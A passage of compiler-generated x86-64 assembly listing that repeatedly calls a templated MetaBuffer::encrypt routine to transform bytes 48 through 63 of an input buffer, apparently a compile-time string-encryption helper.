  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	b8 01 00 00 00	 mov	 eax, 1
  009b7	48 6b c0 3a	 imul	 rax, rax, 58		; 0000003aH
  009bb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009c2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009c6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009cd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  009d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009d9	88 41 3b	 mov	 BYTE PTR [rcx+59], al
  009dc	b8 01 00 00 00	 mov	 eax, 1
  009e1	48 6b c0 3b	 imul	 rax, rax, 59		; 0000003bH
  009e5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009ec	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009f0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009f7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  009fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a03	88 41 3c	 mov	 BYTE PTR [rcx+60], al
  00a06	b8 01 00 00 00	 mov	 eax, 1
  00a0b	48 6b c0 3c	 imul	 rax, rax, 60		; 0000003cH
  00a0f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a16	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a21	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00a26	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a2d	88 41 3d	 mov	 BYTE PTR [rcx+61], al
  00a30	b8 01 00 00 00	 mov	 eax, 1
  00a35	48 6b c0 3d	 imul	 rax, rax, 61		; 0000003dH
  00a39	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a40	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a4b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00a50	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a57	88 41 3e	 mov	 BYTE PTR [rcx+62], al
  00a5a	b8 01 00 00 00	 mov	 eax, 1
  00a5f	48 6b c0 3e	 imul	 rax, rax, 62		; 0000003eH
  00a63	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a6a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a6e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a75	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00a7a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a81	88 41 3f	 mov	 BYTE PTR [rcx+63], al
  00a84	b8 01 00 00 00	 mov	 eax, 1
  00a89	48 6b c0 3f	 imul	 rax, rax, 63		; 0000003fH
  00a8d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a94	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a98	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
